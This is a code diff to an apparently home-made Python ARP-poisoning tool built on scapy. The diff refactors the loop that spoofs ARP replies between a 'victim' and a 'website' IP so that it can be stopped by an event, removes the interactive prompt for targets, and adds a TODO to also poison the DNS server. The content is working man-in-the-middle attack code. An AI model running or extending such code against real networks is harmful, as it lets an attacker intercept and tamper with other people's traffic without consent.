@@ -35,7 +35,7 @@ class ARPPoison:
             print("> IP forwarding enabled.\n")
         else:
             os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-            print("> IP forwarding disabled.\n")
+            print("> IP forwarding disabled.")
     
     def restore_tables(self, ptarget1, ptarget2, hwt1, hwt2):
         pkt = scapy.ARP(op=2, pdst=ptarget1, hwdst=hwt1, psrc=ptarget2, hwsrc=hwt2)
@@ -45,45 +45,13 @@ class ARPPoison:
         print("> ARP tables restored. Exiting...")
         exit(0)
         
-    def attack(self):
+    def attack(self, timer, stop_event):
         self.set_mac()
         self.ip_forward(True)
-        while True:
-            try:
+        while not stop_event.is_set():
                 self.poison(self.victimIP, self.websiteIP, self.victimMAC)
                 self.poison(self.websiteIP, self.victimIP, self.websiteMAC)
+                # TODO Also poison the DNS server
                 time.sleep(10.5 - timer)
-            except KeyboardInterrupt:
-                try:
-                    self.ip_forward(False)
-                    restore = input("> Restore ARP tables? [Y/N] ").strip().lower()
-                    if restore == 'y' or restore == 'yes':
-                        self.restore_tables(self.victimIP, self.websiteIP, self.victimMAC, self.websiteMAC)
-                    else:
-                        print("> ARP tables left spoofed. Exiting...")
-                        exit(0)
-                except KeyboardInterrupt:
-                    print("> ARP tables left spoofed. Exiting...")
-
-if __name__ == "__main__":
-    scapy.conf.verb = 0
-    logging.getLogger("scapy").setLevel(logging.ERROR)
-    try:
-        iface = input("> Interface: ")
-        victim = input("> Victim IP: ")
-        site = input("> Website IP: ")
-        while True:
-            try:
-                timer = int(input("> Aggressiveness (1-10): "))
-                if 1 <= timer <= 10:
-                    break
-                else:
-                    print(">! Integer must be between 1 and 10.")
-            except ValueError:
-                print(">! Please enter an integer.")
-    except KeyboardInterrupt:
-        print("> Poisoning aborted. Exiting...")
-        exit(0)
-
-    spoofer = ARPPoison(iface, victim, site)
-    spoofer.attack()
+            
+        self.ip_forward(False)
